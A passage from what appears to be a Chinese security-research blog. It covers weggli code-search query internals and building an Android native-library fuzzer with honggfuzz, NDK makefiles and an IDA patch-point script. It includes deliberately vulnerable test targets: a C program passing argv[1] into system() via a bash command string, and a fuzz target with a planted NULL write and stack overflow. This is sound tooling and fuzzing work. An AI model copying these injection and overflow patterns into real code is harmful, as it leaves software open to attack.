<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">wtf</span><span class="params">(<span class="keyword">int</span> a)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + <span class="number">1337</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foo</span><span class="params">(<span class="keyword">int</span> bar)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    wtf(bar);</span><br><span class="line"></span><br><span class="line">    system(bar);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *data)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> cmd[<span class="number">2048</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">sprintf</span>(cmd, <span class="string">&quot;/bin/bash %s &gt; /tmp&quot;</span>, data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> system(cmd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>*argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc &lt; <span class="number">2</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foo(<span class="number">11111</span>);</span><br><span class="line">    vuln(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220803130012370.png" alt="image-20220803130012370"></p>
<ul>
<li>匹配函数定义(<code>vuln</code>)</li>
<li>匹配func call <code>vuln(argv[1])</code></li>
</ul>
<p>假如没有对vuln的调用，那就不回返回结果</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220803130323523.png" alt="image-20220803130323523"></p>
<h5 id="multi-query-实现"><a href="#multi-query-实现" class="headerlink" title="multi-query 实现"></a>multi-query 实现</h5><p>这块逻辑主要在 <code>multi_query_worker</code> ，即存在多个workitem的时候会触发，就是在匹配的时候会结合这些query，即将第一个query匹配到的结果先收集起来</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="keyword">mut</span> query_results = <span class="built_in">Vec</span>::with_capacity(num_queries);</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="number">0</span>..num_queries &#123;</span><br><span class="line">    query_results.push(<span class="built_in">Vec</span>::new());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// collect all results</span></span><br><span class="line"><span class="keyword">for</span> ctx <span class="keyword">in</span> results_rx &#123;</span><br><span class="line">    query_results[ctx.query_index].push(ctx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后根据后面的query去做过滤，找到满足的pattern就打印出来</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> filter = |x: &amp;<span class="keyword">mut</span> <span class="built_in">Vec</span>&lt;ResultsCtx&gt;, y: &amp;<span class="keyword">mut</span> <span class="built_in">Vec</span>&lt;ResultsCtx&gt;| &#123;</span><br><span class="line">        x.retain(|r| &#123;</span><br><span class="line">            y.iter()</span><br><span class="line">                .any(|f| r.result.chainable(&amp;r.source, &amp;f.result, &amp;f.source))</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">0</span>..query_results.len() &#123;</span><br><span class="line">        <span class="keyword">let</span> (part1, part2) = query_results.split_at_mut(i + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">let</span> a = part1.last_mut().unwrap();</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> part2 &#123;</span><br><span class="line">            filter(a, b);</span><br><span class="line">            filter(b, a);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="方便调试做的修改"><a href="#方便调试做的修改" class="headerlink" title="方便调试做的修改"></a>方便调试做的修改</h2><h3 id="1-打印-query-tree-和-源码-AST方便定位问题"><a href="#1-打印-query-tree-和-源码-AST方便定位问题" class="headerlink" title="1. 打印 query-tree 和 源码 AST方便定位问题"></a>1. 打印 query-tree 和 源码 AST方便定位问题</h3><p>query-tree的话增加一个 <code>-v</code> 参数就行，会把query tree打印出来</p>
<p><strong>少量代码测试这样是可以的</strong>，也可以使用log模块把信息打出来，不过数据太多了。</p>
<figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/main.rs b/src/main.rs</span></span><br><span class="line"><span class="comment">index a819c5c..caf9a51 100644</span></span><br><span class="line"><span class="comment">--- a/src/main.rs</span></span><br><span class="line"><span class="comment">+++ b/src/main.rs</span></span><br><span class="line"><span class="meta">@@ -468,6 +468,8 @@</span> fn execute_queries_worker(</span><br><span class="line">                 .enumerate()</span><br><span class="line">                 .for_each(|(i, WorkItem &#123; qt, identifiers: _ &#125;)| &#123;</span><br><span class="line">                     // Run query</span><br><span class="line"><span class="addition">+                    let tmp_tree = tree.root_node().to_sexp();</span></span><br><span class="line"><span class="addition">+                    info!(&quot;AST : &#123;&#125;&quot;, tmp_tree);</span></span><br><span class="line">                     let matches = qt.matches(tree.root_node(), &amp;source);</span><br><span class="line"> </span><br><span class="line">                     if matches.is_empty() &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>直观多了 : </p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/note_pic/image-20220802153714210.png" alt="image-20220802153714210"></p>
]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>weggli</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Native Fuzz Demo</title>
    <url>/2021/12/08/Android-Native-Fuzz-Demo/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p>TrapFuzz的思路Fuzzing Android native库，这就是个简单的Demo，只针对黑盒的库。</p>
<span id="more"></span>

<h2 id="honggfuzz-on-Android"><a href="#honggfuzz-on-Android" class="headerlink" title="honggfuzz on Android"></a>honggfuzz on Android</h2><ul>
<li>设置好NDK路径</li>
<li><code>brew install automake</code></li>
</ul>
<p>构建所有的arch(arm64-v8a, armeabi, armeabi-v7a, x86, x86_64)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">make android-all</span><br></pre></td></tr></table></figure>

<p>坑1: libunwind编译的各种问题:</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225631169.png" alt="image-20220824225631169"></p>
<p>macos不好使，换linux去编译，然后用ndk r20.</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225705237.png" alt="image-20220824225705237"></p>
<p>传到手机上试试看：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225722034.png" alt="image-20220824225722034"></p>
<p>然后就是写个demo，在手机上跑一下看看情况</p>
<p><a href="https://github.com/google/honggfuzz/issues/341">hfuzz-cc is missing on android build · Issue #341 · google/honggfuzz</a></p>
<p><a href="https://github.com/google/honggfuzz/issues/342">No coverage information on android · Issue #342 · google/honggfuzz</a></p>
<p>参数 <code>fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls</code></p>
<p>这个参数的话会有警告信息，应该是clang 参数的问题。</p>
<p>后面参考了谷歌的文档，替换了参数，结果没警告了，但是cov还是0.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [14:51:59] </span></span><br><span class="line">$ cat Android.mk </span><br><span class="line">LOCAL_PATH:= $(call my-dir)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_PATH = .</span><br><span class="line">LOCAL_MODULE := hfuzz</span><br><span class="line">LOCAL_EXPORT_C_INCLUDES := <span class="variable">$HOME</span>/honggfuzz/includes</span><br><span class="line">LOCAL_SRC_FILES := /home/muhe/honggfuzz/libs/arm64-v8a/libhfuzz.a</span><br><span class="line">LOCAL_ARM_MODE := arm</span><br><span class="line">include $(PREBUILT_STATIC_LIBRARY)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_PATH = .</span><br><span class="line">LOCAL_MODULE := hfuzzcommon</span><br><span class="line">LOCAL_EXPORT_C_INCLUDES := <span class="variable">$HOME</span>/honggfuzz/includes</span><br><span class="line">LOCAL_SRC_FILES := /home/muhe/honggfuzz/obj/<span class="built_in">local</span>/arm64-v8a/libcommon.a</span><br><span class="line">LOCAL_ARM_MODE := arm</span><br><span class="line">include $(PREBUILT_STATIC_LIBRARY)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_STATIC_LIBRARIES := hfuzz hfuzzcommon</span><br><span class="line">LOCAL_SRC_FILES := fuzz_test.c</span><br><span class="line">LOCAL_MODULE := fuzz_test</span><br><span class="line">LOCAL_ARM_MODE := arm</span><br><span class="line"></span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [14:52:01] </span></span><br><span class="line">$ cat Application.mk </span><br><span class="line">APP_BUILD_SCRIPT := ./Android.mk</span><br><span class="line">APP_STL := c++_shared <span class="comment"># Or system, or none.</span></span><br><span class="line">APP_CFLAGS := -fsanitize=address  -fno-omit-frame-pointer</span><br><span class="line">APP_LDFLAGS := -fsanitize=address </span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [14:52:03] </span></span><br><span class="line">$</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225744530.png" alt="image-20220824225744530"></p>
<hr>
<p>退回到<strong>honggfuzz 2.2</strong> 然后用最开始 #342 那个issue的编译参数是可以的</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225756287.png" alt="image-20220824225756287"></p>
<p>完整项目:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [15:53:52] C:130</span></span><br><span class="line">$ cat Android.mk </span><br><span class="line">LOCAL_PATH:= $(call my-dir)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_PATH = .</span><br><span class="line">LOCAL_MODULE := hfuzz</span><br><span class="line">LOCAL_EXPORT_C_INCLUDES := <span class="variable">$HOME</span>/honggfuzz/includes</span><br><span class="line">LOCAL_SRC_FILES := /home/muhe/honggfuzz/libs/arm64-v8a/libhfuzz.a</span><br><span class="line">include $(PREBUILT_STATIC_LIBRARY)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_PATH = .</span><br><span class="line">LOCAL_MODULE := hfuzzcommon</span><br><span class="line">LOCAL_EXPORT_C_INCLUDES := <span class="variable">$HOME</span>/honggfuzz/includes</span><br><span class="line">LOCAL_SRC_FILES := /home/muhe/honggfuzz/obj/<span class="built_in">local</span>/arm64-v8a/libcommon.a</span><br><span class="line">include $(PREBUILT_STATIC_LIBRARY)</span><br><span class="line"></span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_STATIC_LIBRARIES := hfuzz hfuzzcommon</span><br><span class="line">LOCAL_SRC_FILES := fuzz_test.c</span><br><span class="line">LOCAL_MODULE := fuzz_test</span><br><span class="line">LOCAL_CFLAGS := -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls</span><br><span class="line">LOCAL_LD_FLAGS := -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls</span><br><span class="line"></span><br><span class="line">include $(BUILD_EXECUTABLE)</span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [15:53:53] </span></span><br><span class="line">$ cat Application.mk </span><br><span class="line">APP_BUILD_SCRIPT := ./Android.mk</span><br><span class="line"><span class="comment">#APP_STL := c++_shared # Or system, or none.</span></span><br><span class="line"><span class="comment">#APP_CFLAGS := -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls </span></span><br><span class="line"><span class="comment">#APP_LDFLAGS := -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># muhe @ muhe-Parallels-Virtual-Platform in ~/ndk_fuzzing_demo [15:53:55] </span></span><br><span class="line">$ cat fuzz_test.c </span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line">int test_target(char* input_file_path, char* argv_0)</span><br><span class="line">&#123;</span><br><span class="line">    char *crash = NULL;</span><br><span class="line">    FILE *fp = fopen(input_file_path, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    char c;</span><br><span class="line">    <span class="keyword">if</span> (!fp) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error opening file\\n&quot;</span>);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fread(&amp;c, 1, 1, fp) != 1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error reading file\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;t&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error 1\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fread(&amp;c, 1, 1, fp) != 1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error reading file\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;e&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error 2\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fread(&amp;c, 1, 1, fp) != 1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error reading file\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;s&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error 3\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (fread(&amp;c, 1, 1, fp) != 1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error reading file\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c != <span class="string">&#x27;t&#x27;</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error 4\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;!!!!!!!!!!OK!!!!!!!!!!\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fread(&amp;c, 1, 1, fp) != 1) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error reading file\\n&quot;</span>);</span><br><span class="line">        fclose(fp);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (c == <span class="string">&#x27;1&#x27;</span>) &#123;</span><br><span class="line">        // cause a crash</span><br><span class="line">        crash[0] = 1;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;2&#x27;</span>) &#123;</span><br><span class="line">        char buffer[5] = &#123; 0 &#125;;</span><br><span class="line">        // stack-based overflow to trigger the GS cookie corruption</span><br><span class="line">        <span class="keyword">for</span> (int i = 0; i &lt; 5; ++i)</span><br><span class="line">            strcat(buffer, argv_0);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;buffer: %s\\n&quot;</span>, buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error 5\\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(argc &lt; 2) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Usage: %s &lt;input file&gt;\\n&quot;</span>, argv[0]);</span><br><span class="line">        <span class="built_in">return</span> 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">        //regular single target call</span><br><span class="line">    <span class="built_in">return</span> test_target(argv[1], argv[0]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ndk构建命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ndk-build NDK_PROJECT_PATH=. NDK_APPLICATION_MK=Application.mk TARGET_ARCH_ABI=arm64-v8a</span><br></pre></td></tr></table></figure>

<h2 id="write-harness-for-so"><a href="#write-harness-for-so" class="headerlink" title="write harness for .so"></a>write harness for <code>.so</code></h2><h3 id="使用native-harness-target"><a href="#使用native-harness-target" class="headerlink" title="使用native-harness-target"></a>使用native-harness-target</h3><p>参考项目 : <a href="https://github.com/CalebFenton/native-harness-target">https://github.com/CalebFenton/native-harness-target</a></p>
<p>Android 7.1.1</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225812164.png" alt="image-20220824225812164"></p>
<p>可以使用这个方式跑起来，不过速度及其的慢。</p>
<p><strong>TODO :</strong></p>
<ol>
<li>速度问题，考虑docker Android或者qemu-kvm</li>
<li>port 到 Android 10</li>
</ol>
<p>Android 10 :</p>
<p><a href="https://github.com/rednaga/native-shim">rednaga/native-shim</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=`<span class="built_in">pwd</span>`:/apex/com.android.runtime/lib::<span class="variable">$LD_LIBRARY_PATH</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=`<span class="built_in">pwd</span>`:/apex/com.android.runtime/lib64:<span class="variable">$LD_LIBRARY_PATH</span></span><br><span class="line">255|walleye:/data/<span class="built_in">local</span>/tmp <span class="comment"># ./shim libstr-crypt.so</span></span><br><span class="line">[*] native-shim - diff</span><br><span class="line"> [+] Attempting to load : [ libstr-crypt.so ]</span><br><span class="line"> [+] Library Loaded!</span><br><span class="line"> [+] Initializing JavaVM Instance</span><br><span class="line"> [+] Initialization success (vm=0x74eb6901c0, env=0x74eb6e06c0)</span><br><span class="line"> [+] Found JNI_OnLoad, attempting to call</span><br><span class="line"> [+] Closing library</span><br><span class="line">walleye:/data/<span class="built_in">local</span>/tmp <span class="comment">#</span></span><br></pre></td></tr></table></figure>

<h3 id="libpl-droidsonroids-gif-so测试"><a href="#libpl-droidsonroids-gif-so测试" class="headerlink" title="libpl_droidsonroids_gif.so测试"></a>libpl_droidsonroids_gif.so测试</h3><p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824225828132.png" alt="image-20220824225828132"></p>
<h2 id="work-with-honggfuzz"><a href="#work-with-honggfuzz" class="headerlink" title="work with honggfuzz"></a>work with honggfuzz</h2><blockquote>
<p>经典的 patch 跳转指令，实现一个debugger来获取覆盖率的方案</p>
</blockquote>
<ul>
<li><p>使用之前 patch跳转的方式搞覆盖率，修改honggfuzz即可</p>
<p>问题 ： 创建JVM相关的操作耗时，影响效率</p>
</li>
<li><p>为了解决效率问题，如果可以自己写一个，初始化之后，fork，然后疯狂搞fork出来的子进程即可，这样效率就上去了。</p>
</li>
</ul>
<h3 id="get-all-JUMP-INS"><a href="#get-all-JUMP-INS" class="headerlink" title="get all JUMP INS"></a>get all JUMP INS</h3><p>获取patch需要patch的指令地址，直接从p0tools里抄</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> idautils</span><br><span class="line"><span class="keyword">import</span> idaapi</span><br><span class="line"><span class="keyword">import</span> ida_nalt</span><br><span class="line"><span class="keyword">import</span> idc</span><br><span class="line"></span><br><span class="line"><span class="comment"># See &lt;https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os.path <span class="keyword">import</span> expanduser</span><br><span class="line">home = expanduser(<span class="string">&quot;~&quot;</span>)</span><br><span class="line"></span><br><span class="line">patchpoints = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line">max_offset = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> seg_ea <span class="keyword">in</span> idautils.Segments():</span><br><span class="line">    name = idc.get_segm_name(seg_ea)</span><br><span class="line">    <span class="keyword">if</span> name != <span class="string">&quot;.text&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    start = idc.get_segm_start(seg_ea)</span><br><span class="line">    end = idc.get_segm_end(seg_ea)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(start), <span class="built_in">hex</span>(end))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> func_ea <span class="keyword">in</span> idautils.Functions(start, end):</span><br><span class="line">        f = idaapi.get_func(func_ea)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> f:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">for</span> block <span class="keyword">in</span> idaapi.FlowChart(f):</span><br><span class="line">            <span class="keyword">if</span> start &lt;= block.start_ea &lt; end:</span><br><span class="line">                max_offset = <span class="built_in">max</span>(max_offset, block.start_ea)</span><br><span class="line">                patchpoints.add(block.start_ea)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Warning, broken CFG?&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Round up max_offset to page size</span></span><br><span class="line">size = max_offset</span><br><span class="line">rem = size % <span class="number">0x1000</span></span><br><span class="line"><span class="keyword">if</span> rem != <span class="number">0</span>:</span><br><span class="line">    size += <span class="number">0x1000</span> - rem</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(home + <span class="string">&quot;/Desktop/patches.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(ida_nalt.get_root_filename() + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">hex</span>(size) + <span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line">    f.write(<span class="string">&#x27;\\n&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">hex</span>, <span class="built_in">sorted</span>(patchpoints))))</span><br><span class="line">    f.write(<span class="string">&#x27;\\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Done, found &#123;&#125; patchpoints&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(patchpoints)))</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824230049472.png" alt="image-20220824230049472"></p>
<h3 id="Patch-or-hook-INS"><a href="#Patch-or-hook-INS" class="headerlink" title="Patch or hook INS"></a>Patch or hook INS</h3><p>问题 ： 需要想办法做到 hfuzzcc一样的效果，即 把 libhfuzz.a 链接进目标binary，不然没有桩信息。</p>
<ul>
<li>看看hfuzzcc是怎么工作的</li>
</ul>
<p>看起来就是一层wrapper，给clang/gcc编译的时候增加了 <code>CFLAGS</code> 和 <code>LDFLAGS</code>，看起来只需要按照需求把参数放到 <code>Android.mk</code>即可。</p>
<p>这里参考ImageIO例子中的编译的参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cc</span><br><span class="line">-I/Users/vuln_test/honggfuzz/includes/</span><br><span class="line">-Wno-unused-command-line-argument</span><br><span class="line">-fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls</span><br><span class="line">-mllvm</span><br><span class="line">-sanitizer-coverage-prune-blocks=1</span><br><span class="line">-fno-inline</span><br><span class="line">-fno-builtin</span><br><span class="line">-fno-omit-frame-pointer</span><br><span class="line">-D__NO_STRING_INLINES</span><br><span class="line"></span><br><span class="line">-DHFND_FUZZING_ENTRY_FUNCTION_CXX(x,y)=extern const char* LIBHFNETDRIVER_module_netdriver;const char** LIBHFNETDRIVER_tmp1 = &amp;LIBHFNETDRIVER_module_netdriver;extern <span class="string">&quot;C&quot;</span> int HonggfuzzNetDriver_main(x,y);int HonggfuzzNetDriver_main(x,y)</span><br><span class="line"></span><br><span class="line">-DHFND_FUZZING_ENTRY_FUNCTION(x,y)=extern const char* LIBHFNETDRIVER_module_netdriver;const char** LIBHFNETDRIVER_tmp1 = &amp;LIBHFNETDRIVER_module_netdriver;int HonggfuzzNetDriver_main(x,y);int HonggfuzzNetDriver_main(x,y)</span><br><span class="line"></span><br><span class="line">-Wl,-U,_HonggfuzzNetDriver_main</span><br><span class="line">-Wl,-U,_LIBHFUZZ_module_instrument</span><br><span class="line">-Wl,-U,_LIBHFUZZ_module_memorycmp</span><br><span class="line">**-o</span><br><span class="line">runner**</span><br><span class="line">**runner.m**</span><br><span class="line">-framework</span><br><span class="line">Foundation</span><br><span class="line">-framework</span><br><span class="line">CoreGraphics</span><br><span class="line">-framework</span><br><span class="line">AppKit</span><br><span class="line">/tmp/libhfnetdriver.501.7140081f7cd58e92.a</span><br><span class="line">/tmp/**libhfuzz**.501.2fdc27091cd8b54d.a</span><br><span class="line">/tmp/libhfuzz.501.a5556386f906dc80.a</span><br><span class="line">-pthread</span><br><span class="line">-ldl</span><br><span class="line">include $(CLEAR_VARS)</span><br><span class="line">LOCAL_STATIC_LIBRARIES := hfuzz hfuzzcommon </span><br><span class="line">LOCAL_SRC_FILES := fuzz_test.c</span><br><span class="line">LOCAL_MODULE := fuzz_test</span><br><span class="line">LOCAL_CFLAGS :=  -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls \\</span><br><span class="line">                 -fno-omit-frame-pointer -fno-inline -fno-builtin \\</span><br><span class="line">                 -fno-omit-frame-pointer -Wl,-u,_LIBHFUZZ_module_instrument -Wl,-u,_LIBHFUZZ_module_memorycmp -ldl</span><br><span class="line"></span><br><span class="line">LOCAL_LDFLAGS :=  -fsanitize-coverage=trace-pc-guard,trace-cmp,trace-div,indirect-calls \\</span><br><span class="line">                   -fno-inline -fno-builtin \\</span><br><span class="line">                   -fno-omit-frame-pointer -Wl,-u,_LIBHFUZZ_module_instrument -Wl,-u,_LIBHFUZZ_module_memorycm</span><br></pre></td></tr></table></figure>

<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824230115528.png" alt="image-20220824230115528"></p>
<p>harness里需要主动调用 <code>initializeTrapfuzz()</code></p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824230125768.png" alt="image-20220824230125768"></p>
<p>看起来一切都不错！</p>
<p>获取指定so地址也有了：</p>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824230138101.png" alt="image-20220824230138101"></p>
<ul>
<li>Patch</li>
</ul>
<p><img src="https://my-own-image.oss-cn-beijing.aliyuncs.com/img/image-20220824230152707.png" alt="image-20220824230152707"></p>
<p>参考这里修改honggfuzz的代码即可</p>
